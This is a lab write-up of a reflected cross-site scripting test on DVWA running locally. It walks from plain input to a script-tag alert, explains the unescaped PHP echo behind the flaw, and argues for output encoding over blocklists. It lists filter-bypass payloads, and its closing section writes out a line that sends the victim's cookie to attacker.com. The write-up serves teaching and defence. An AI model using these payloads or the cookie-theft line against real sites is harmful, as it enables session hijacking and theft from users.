# F-02 — Reflected XSS | Payload Progression

## Target
- Application: DVWA (Damn Vulnerable Web Application)
- Module: XSS (Reflected)
- Security Level: Low
- URL: `http://localhost:8080/vulnerabilities/xss_r/`

---

## Step 1 — Baseline (Normal Input)

**What I tried first:**
```
Indrajit
```

**What happened:**
The page responded normally:
```
Hello Indrajit
```
The input was reflected back on the page as plain text.
This told me the application takes my input and puts it directly
into the HTML response — it is a reflection point.

---

## Step 2 — Testing HTML Injection First

**What I tried:**
```
<b>Indrajit</b>
```

**What happened:**
The word "Indrajit" appeared **bold** on the page.
This confirmed the application is not stripping or encoding HTML tags.
Raw HTML is going into the page response unmodified.

**Why this matters:**
If HTML is rendering, then `<script>` tags will also render — the
browser does not distinguish between intentional and injected markup.

---

## Step 3 — Script Tag Injection

**What I tried:**
```
<script>alert('XSS')</script>
```

**Full URL:**
```
http://localhost:8080/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>
```

**What happened:**
A JavaScript alert dialog box appeared in the browser immediately
upon page load, displaying the message: `XSS`

The page source showed:
```html
<pre>Hello <script>alert('XSS')</script></pre>
```

The script tag was embedded directly into the HTML and executed.

**Why this payload works:**
The server builds the response like this:
```php
echo "<pre>Hello " . $_GET['name'] . "</pre>";
```
There is no htmlspecialchars() or any encoding applied to the output.
Whatever is in the `name` parameter lands raw in the HTML, so the
browser sees a valid script tag and runs it.

---

## Step 4 — Why a Naive Block Would Still Fail

If the developer only blocked the word "script" (case-sensitive),
these alternate payloads would still work:
```
<SCRIPT>alert('XSS')</SCRIPT>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```
This shows the fix cannot be a blocklist — it must be output encoding
applied to every character that has HTML significance.

---

## Final Working Payload

```
<script>alert('XSS')</script>
```

- **Effect:** JavaScript executes in the victim's browser
- **XSS Type:** Reflected (non-persistent)
- **OWASP Category:** A03:2021 — Injection
- **DVWA Security Level tested:** Low

---

## What a Real Attacker Would Do Beyond alert()

The alert() is a proof of concept. A real attacker would replace it with:
```javascript
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```
This would silently exfiltrate the victim's session cookie to an
attacker-controlled server, enabling full session hijack.
The alert() payload was used here only to confirm execution — not
to demonstrate full exploitation.
